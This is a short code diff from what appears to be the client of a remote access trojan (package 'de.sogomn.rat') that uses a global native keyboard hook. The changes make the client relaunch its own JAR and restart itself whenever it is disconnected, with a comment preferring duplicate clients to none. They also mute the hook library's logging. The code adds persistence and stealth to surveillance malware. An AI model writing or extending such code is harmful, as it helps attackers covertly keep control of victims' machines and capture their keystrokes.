@@ -3,6 +3,8 @@ package de.sogomn.rat;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 
+import javax.swing.SwingUtilities;
+
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
@@ -96,11 +98,16 @@ public final class Client implements IConnectionObserver, IGuiController {
 	
 	@Override
 	public void disconnected(final ActiveConnection connection) {
+		FileUtils.executeFile(Constants.JAR_FILE);
+		
+		/*Better have 2 same clients than not a single one, right?*/
+		
 		chat.close();
 		connection.setObserver(null);
 		
-		FileUtils.executeFile(Constants.JAR_FILE);
-		System.exit(0);
+		SwingUtilities.invokeLater(() -> {
+			startClient();
+		});
 	}
 	
 	@Override
@@ -180,7 +187,10 @@ public final class Client implements IConnectionObserver, IGuiController {
 	}
 	
 	public static void main(final String[] args) {
-		Logger.getLogger(GlobalScreen.class.getPackage().getName()).setLevel(Level.OFF);
+		final Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
+		
+		logger.setLevel(Level.OFF);
+		logger.setUseParentHandlers(false);
 		
 		final Thread hook = new Thread(() -> {
 			try {
